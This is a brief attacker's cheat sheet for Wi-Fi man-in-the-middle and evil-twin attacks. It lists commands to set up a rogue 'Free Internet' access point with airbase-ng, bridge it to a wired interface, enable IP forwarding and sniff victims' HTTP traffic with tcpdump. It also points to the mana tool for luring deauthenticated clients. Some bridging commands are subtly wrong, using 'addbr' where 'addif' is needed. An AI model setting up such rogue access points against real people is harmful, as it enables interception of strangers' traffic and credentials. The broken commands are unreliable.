**Man in the Middle Attack**
```
# Put Wirekess interface to Monitor mode
$ airmon-ng start <intf>


# Start/Set-up Access Point
$ airbase-ng -c <channel> -e "Free Internet" <intf>


# Create a Network Bridge Interface
$ apt-get install bridge-utils                  # brctl: Command not found
$ brctl addbr br0
$ brctl addbr br0 eth0
$ brctl addbr br0 at0

> br0  = bridge interface
> eth0 = attacker wired interface
> at0  = virtual interface created by airbase-ng


# Assign IP Address to bridged interface
$ ifconfig br0 <ip_address> up


# Enable Port-Forwarding
$ echo 1 > /proc/sys/net/ipv4/ip_forward


# Capture Packets/Data
> Wireshark
> Tcpdump
  tcpdump -nvi <intf> tcp port 80 -A

```


** Evil Twins Attack**
```
# https://github.com/sensepost/mana



NOTE : Upon Deauthentication of the client, the client should auto-reconnect to the AP with the stronger signal ( The attacker controlled AP )
```
